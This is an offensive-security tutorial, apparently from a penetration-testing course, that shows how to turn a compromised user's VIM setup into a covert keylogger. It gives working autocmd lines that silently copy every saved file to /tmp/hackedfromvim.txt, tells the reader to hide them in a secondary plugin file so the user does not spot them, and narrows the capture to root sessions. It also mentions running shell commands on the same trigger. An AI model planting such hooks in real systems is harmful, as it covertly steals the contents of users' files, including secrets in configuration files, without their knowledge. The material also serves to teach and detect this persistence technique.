# VIM Config File Keylogger

{% hint style="info" %}
we want to create a rudimentary keylogger to log any changes a user makes to a file using our compromised VIM editor. This could be useful for capturing sensitive data in configuration files or scripts.

For this scenario we imagine that the current system uses a restricted VIM environment that blocks any shell commands.
{% endhint %}

## AutoCommand

We can use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events

Some useful examples are VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and BufWritePost (after writing a change buffer to a file). All of these provide different triggers for performing actions that might benefit an attacker.

We don’t want to risk preventing the user from actually saving their files as this might alert them. To avoid this, we can perform our actions based on the BufWritePost event in VIM. This activates once a buffer has already been written to the intended file.

We can define an autocommand using the autocmd keyword. We then specify which autocommand trigger we want to use, then identify which files we want it to act on. Finally, we’ll provide the command we want to perform once the action is triggered. Let’s set up an autocommand that fires on the BufWritePost action and then writes the content of the file to a log file we specify. We want the action to work on all files being edited. The command would look something like this.

```
echo "" > .vimrc
vi
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
```

In the above command, we start by specifying that we’re defining an autocommand via :autocmd . BufWritePost is the event we’re going to trigger on, meaning that after a buffer is written to a file, we will perform our action. The “\*” specifies that this action will be performed for all files being edited. We could change this to match only files with a particular name or file extension, but in our case we want to do this for every file. Everything after this point is the actual command we’ll perform when the trigger is activated.

## Keylogger

The command being run after our condition is triggered is made up of several subcommands. First, we specify that there shouldn’t be any debug output by using the :silent command. We then use :w! to save the buffer contents. The exclamation point (!) is a force modifier. In this case, it will overwrite an existing file if one exists and write to file, even if the file doesn’t already exist. We then redirect the output to append to `/tmp/hackedfromvim.txt.`

Putting the above command into our user’s `.vimrc` file is not very discreet, so let’s add a layer of obfuscation. To do this, we can load a secondary VIM configuration file from a different location. We’ll put our command in `/home/offsec/.vim/plugin/settings.vim`.

While this doesn’t prevent the user from viewing the file, it does make it less likely the user will see it. If we run VIM on a test file and insert any content, we notice that we don’t get any error messages or indication that anything is wrong and the output file is written successfully.

{% hint style="info" %}
It’s also possible to run shell commands on an autocommand trigger. For example, if we wanted to run a shell script instead of saving the buffer to a file, we could just replace everything after `“:silent”` with `“!”` followed by a shell script name or shell command. Note that in our current restricted environment, we can’t use this approach.
{% endhint %}

## Being More Specific

This approach is useful, but it logs the entire contents of the changed file to our log file for every file the target user edits. Our log file could grow quickly. Let’s refine our attack to include only files that the user is editing using elevated permissions.

VIM allows for control logic in its internal scripting language. it’s possible to access environment variables from within VIM, including which user the application is running as.

VIM supports the use of basic if statements in its configuration scripts in this manner.

```
:if <some condition>
:<some command>
:else
:<some alternative command>
:endif
```

Combining this with the ability to use environment variables, we can check whether the user is running as root.

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

we replace our line in settings.vim with this.

in some system configurations it’s possible to persist the VIM’s user environment settings in a sudo context. In these situations, when the user runs VIM as themselves, VIM behaves normally. When they run VIM in a sudo context, however, the keylogger will write any changes they make to files to the log file we’ve specified.
